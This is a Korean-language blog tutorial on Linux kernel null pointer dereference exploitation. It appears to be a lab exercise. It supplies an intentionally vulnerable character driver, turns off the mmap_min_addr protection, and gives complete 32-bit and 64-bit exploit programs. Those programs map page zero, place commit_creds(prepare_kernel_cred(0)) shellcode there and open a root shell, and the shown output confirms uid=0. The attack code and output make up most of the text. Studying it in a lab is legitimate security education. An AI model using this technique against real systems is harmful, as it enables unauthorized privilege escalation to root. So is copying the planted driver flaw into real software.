---
title: Null Pointer Dereference
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, null pointer dereference]
math: true
mermaid: true
---

## Description

프로그램에서 유효한 영역으로 예상되는 포인터(주소영역)을 역참조할 때 발생하는 취약점이다. 대부분 포인터의 주소가 null(0x0)일 경우 발생한다. 해당 취약점에 의해 악용 가능한 형태는 대부분 DoS이며, 드문 환경에서 코드 또는 명령어 실행 가능

## 0-address protection

0-address protection은 커널과 사용자 공간이 가상 메모리 주소를 공유하기 때문에 사용자 공간 mmap’d 메모리 주소 0에서 시작할 수 없도록 “null" 메모리 공간을 보호해준다. 0-address protection으로 인해 “NULL dereference" 커널 공격 방어 가능하다. 0-address protection은 2.6.22 커널에서 가능하며 sysctl 명령어를 이용해 mmap_min_addr로 보호 영역의 크기를 설정할 수 있다. 우분투 9.04 이후, mmap_min_addr 설정은 커널에 내장된다.

## Set environment

mmap_min_addr 설정한다.

```bash
$ sysctl vm.mmap_min_addr
vm.mmap_min_addr = 65536
$ sudo sysctl -w vm.mmap_min_addr="0"
vm.mmap_min_addr = 0
```

null pointer dereference 구현하기 위해 포인터 함수 선언한다.

- void (*myFunPtr)(void);

해당 함수는 chardev_write() 함수에서 호출하고 종료된다.

```c
// chardev.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>

MODULE_LICENSE("Dual BSD/GPL");

#define DRIVER_NAME "chardev"
#define BUFFER_SIZE 64
    
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 2;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;

static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);

struct file_operations chardev_fops = {
    .release = chardev_release,
    .write   = chardev_write,
};

struct data {
    unsigned char buffer[BUFFER_SIZE];
};

static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    dev_t dev;

    printk("The chardev_init() function has been called.");
    
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);

    //initialize a cdev structure
    cdev_init(&chardev_cdev, &chardev_fops);
    chardev_cdev.owner = THIS_MODULE;

    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }

    device_create(chardev_class, NULL, MKDEV(chardev_major, MINOR_BASE), NULL, "chardev%d", MINOR_BASE);

    return 0;
}

static void chardev_exit(void)
{
    int minor;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
    
    printk("The chardev_exit() function has been called.");
    
    for (minor = MINOR_BASE; minor < MINOR_BASE + MINOR_NUM; minor++) {
        device_destroy(chardev_class, MKDEV(chardev_major, minor));
    }

    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}

static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_release() function has been called.");
    if (file->private_data) {
        kfree(file->private_data);
        file->private_data = NULL;
    }
    return 0;
}

void (*myFunPtr)(void);
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    myFunPtr();
    return count;
}

module_init(chardev_init);
module_exit(chardev_exit);
```

0x0 영역에 0xdeadbeef 영역을 호출하는 shellcode 저장한다. 취약한 driver 파일을 오픈 후 write() 함수를 이용해 chardev_write() 함수가 호출되도록 한다.

```c
// gcc test.c -o test
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

char payload[] = "\xe8\xea\xbe\xad\xde";  // call 0xdeadbeef
int main(){
    
    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);
    if(addr != 0){
        perror("[-] Unable to map zero page");
        exit(-1);
    }
    printf("[+] Mapped zero page\n");
    memcpy(0,payload,sizeof(payload));
    int fd = open("/dev/chardev0",O_RDWR);
    write(fd,"AAAA",4);
    close(fd);
}
```

debug 시 0xfbb1a280 영역에 0x0이 저장되어 있고 0x0 영역에 있는 0xdeadbeef를 호출한다.

```
1: x/i $eip
=> 0xfbb1800b:  call   DWORD PTR ds:0xfbb1a280
(gdb) x/wx 0xfbb1a280
0xfbb1a280: 0x00000000
(gdb) si
0x00000000 in ?? ()
1: x/i $eip
=> 0x0: call   0xdeadbeef
```

### Exploit 32-bit

prepare_kernel_cred, commit_creds 주소를 확인한다.

```
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep prepare_kernel_cred
c1082e20 T prepare_kernel_cred
c19d16e4 R __ksymtab_prepare_kernel_cred
c19dea74 r __kcrctab_prepare_kernel_cred
c19e5f5f r __kstrtab_prepare_kernel_cred
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep commit_creds
c1082b60 T commit_creds
c19cd2cc R __ksymtab_commit_creds
c19dc868 r __kcrctab_commit_creds
c19e5f9b r __kstrtab_commit_creds
```

권 상승하는 shellcode를 생성한다.

```
//commit_creds(prepare_kernel_cred(0))
xor %eax,%eax
call 0xc1082e20
call 0xc1082b60
ret
```

objdump로 disassemble 후 쉘코드를 확인한다.

```
bs@bs-virtual-machine:~/Desktop$ objdump -d asm
asm:     file format elf32-i386
Disassembly of section .text:
00000000 <__bss_start-0x100d>:
0:  31 c0                   xor    %eax,%eax
2:  e8 19 2e 08 c1          call   c1082e20 <_end+0xc1081e10>
7:  e8 54 2b 08 c1          call   c1082b60 <_end+0xc1081b50>
c:  c3                      ret 
```

## Exploit code

```c
// gcc exploit.c -o exploit
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

char payload[] = "\x31\xc0\xe8\x19\x2e\x08\xc1\xe8\x54\x2b\x08\xc1\xc3";
int main(){
    
    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);
    if(addr != 0){
        perror("[-] Unable to map zero page");
        exit(-1);
    }
    printf("[+] Mapped zero page\n");
    memcpy(0,payload,sizeof(payload));
    int fd = open("/dev/chardev0",O_RDWR);
    write(fd,"AAAA",4);
    system("/bin/sh");
    close(fd);
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./test 
[+] Mapped zero page
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Exploit 64-bit

prepare_kernel_cred, commit_creds 주소를 확인한다.

```
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8109da40 T prepare_kernel_cred
ffffffff81b8c850 R __ksymtab_prepare_kernel_cred
ffffffff81ba7c30 r __kcrctab_prepare_kernel_cred
ffffffff81bb4867 r __kstrtab_prepare_kernel_cred
bs@bs-virtual-machine:~/Desktop$ cat /proc/kallsyms | grep commit_creds
ffffffff8109d760 T commit_creds
ffffffff81b83d40 R __ksymtab_commit_creds
ffffffff81ba36a8 r __kcrctab_commit_creds
ffffffff81bb48ae r __kstrtab_commit_creds
```

rdi를 0으로 변경 후 commit_creds(prepare_kernel_cred(NULL)) 호출하는 쉘코드 작성한다.

```
xor %rdi,%rdi
call 0xffffffff8109da40
xchg %rdi,%rax
call 0xffffffff8109d760
ret
```

objdump로 assembly 확인한다.

```
bs@bs-virtual-machine:~/Desktop$ gcc asm.s -o asm -nostdlib -Ttext=0
/usr/bin/ld: warning: cannot find entry symbol _start; defaulting to 0000000000000000
bs@bs-virtual-machine:~/Desktop$ objdump -d asm
asm:     file format elf64-x86-64
Disassembly of section .text:
0000000000000000 <__bss_start-0x201000>:
0:  48 31 ff                xor    %rdi,%rdi
3:  e8 38 da 09 81          callq  ffffffff8109da40 <__bss_start+0xffffffff80e9ca40>
8:  48 97                   xchg   %rax,%rdi
a:  e8 51 d7 09 81          callq  ffffffff8109d760 <__bss_start+0xffffffff80e9c760>
f:  c3                      retq    
```

## Exploit code

```c
// gcc exploit.c -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>

char payload[]="\x48\x31\xff\xe8\x38\xda\x09\x81\x48\x97\xe8\x51\xd7\x09\x81\xc3";

int main(){
    char *addr = mmap(0x0,0x1000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(addr != 0x0){
        perror("mmap error");
    }
    printf("[+] 0x0 mapped\n");

    memcpy(0,payload,sizeof(payload));
    
    int fd = open("/dev/chardev0",O_RDWR);
    write(fd,"AAAA",0x4);
    system("/bin/sh");
    close(fd);   
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./exploit 
[+] 0x0 mapped
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [05.Null pointer dereference(32bit & 64bit)](https://www.lazenca.net/pages/viewpage.action?pageId=25624632)